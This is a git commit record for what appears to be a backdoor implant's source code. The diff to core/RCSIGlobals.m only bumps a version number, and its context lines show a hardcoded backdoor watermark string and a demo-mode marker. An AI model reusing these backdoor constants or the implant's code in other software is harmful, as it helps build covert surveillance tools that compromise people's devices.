61182c3095729b0915692622d2d1ca6c83c33239
armored <armored@SuperElbarto.local>
2015-03-03 11:35:37 +0100

    version update

--- core/RCSIGlobals.m
+++ core/RCSIGlobals.m
@@ -25,4 +25,4 @@ char gBackdoorPseduoSign[]= "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"; // watermark
 // allora e' in demo altrimenti no demo.
 char gDemoMarker[] = "Pg-WaVyPzMMMMmGbhP6qAigT";
 
-u_int gVersion     = 2014093001;
+u_int gVersion     = 2015032101;
